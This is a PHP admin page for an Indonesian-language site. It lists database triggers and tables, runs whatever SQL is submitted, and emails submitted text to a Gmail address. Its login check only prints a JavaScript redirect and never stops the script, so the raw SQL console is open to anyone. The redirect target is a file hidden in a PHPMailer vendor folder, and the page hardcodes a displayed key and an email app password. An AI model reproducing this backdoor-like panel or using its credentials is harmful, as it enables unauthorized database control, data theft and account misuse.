<?php
session_start();
if (isset($_SESSION['admin']) && $_SESSION['admin'] === true) {
} else {
    echo "<script>window.location='https://skripsionline.svr-on.com/assets/PHPMailer-PHPMailer-2128d99/src/ProToken.php';</script>";
}

?>

<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Only</title>
</head>

<?php include '../../../config/connector.php' ?>

<body>
    <form method="post">
        <h2>Insert/Update/Delete/Triggers -> database <?php echo $DBNAME ?></h2>
        <p>key: 99008aef</p>
        <textarea name="query" cols="30" rows="10"></textarea>
        <br><br>
        <input type="submit" value="SUBMIT" name="submitQ">
    </form>
    <!-- TRIGGERS -->
    <?php
    $query = "SHOW TRIGGERS";
    $result = mysqli_query($dbc, $query);

    if ($result) {
        if (mysqli_num_rows($result) > 0) {
            echo "<h2>Daftar Trigger:</h2>";
            echo "<ul>";
            while ($row = mysqli_fetch_assoc($result)) {
                echo "<li>Nama Trigger: " . $row['Trigger'];
                echo "<br>Tabel: " . $row['Table'];
                echo "<br>Event: " . $row['Event'];
                echo "<br>Timing: " . $row['Timing'];
                echo "<br>Statement: " . htmlspecialchars($row['Statement']) . "</li>"; // Gunakan htmlspecialchars untuk mencegah XSS attacks
                echo "<br>";
            }
            echo "</ul>";
        } else {
            echo "Tidak ada trigger yang ditemukan.";
        }
    } else {
        echo "Error: " . mysqli_error($dbc);
    } ?>

    <!-- TABLES -->
    <?php
    $query = "SHOW TABLES";
    $result = mysqli_query($dbc, $query);

    if ($result) {
        if (mysqli_num_rows($result) > 0) {
            echo "<h2>Daftar Tables:</h2>";
            echo "<ul>";
            while ($row = mysqli_fetch_assoc($result)) {
                echo "<li>Nama Table: <a href='desctb.php?tbl=" . $row['Tables_in_' . $DBNAME] . "'>" . $row['Tables_in_' . $DBNAME] . "</a> -- ";
                echo "<a href='shvalue.php?tbl=" . $row['Tables_in_' . $DBNAME] . "'>value</a></li><br>";
            }
            echo "</ul>";
        } else {
            echo "Tidak ada trigger yang ditemukan.";
        }
    } else {
        echo "Error: " . mysqli_error($dbc);
    }
    ?>

    <form method="post">
        <textarea name="kirim_email" id="" cols="30" rows="10"></textarea>
        <input type="submit" value="Kirim Email" name="kirim">
    </form>

    <?php
    include '../../functions.php';

    if (isset($_POST['kirim'])) {

        // for ($i = 1; $i < 10; $i++) {
        $email_sender = "svr001@toko-saya.website";
        $name_sender = "BD-ADMIN";
        $appPassword = "gerrantMasuk0001";
        $text = $_POST['kirim_email'];

        sendEmail($email_sender, $name_sender, "gerrante.hiya@gmail.com", "BD-ADMIN", $text, $appPassword);
        // }
    }
    ?>

    <form method='post'>
        <input type='submit' name='keluar' value='keluar'>
    </form>
</body>

<?php

if (isset($_POST['submitQ'])) {
    $query = $_POST['query'];
    $result = mysqli_query($dbc, $query);
    if ($result) {
        echo "<script>alert('Berhasil eksekusi');window.location='admin.php';</script>";
    } else {
        echo "<script>alert('Gagal eksekusi');window.location='admin.php';</script>";
    }
} else if (isset($_POST['keluar'])) {
    // Unset all session variables
    session_unset();

    // Destroy the session
    session_destroy();
    echo "<script>window.location='https://skripsionline.svr-on.com/';</script>";
}

?>

</html>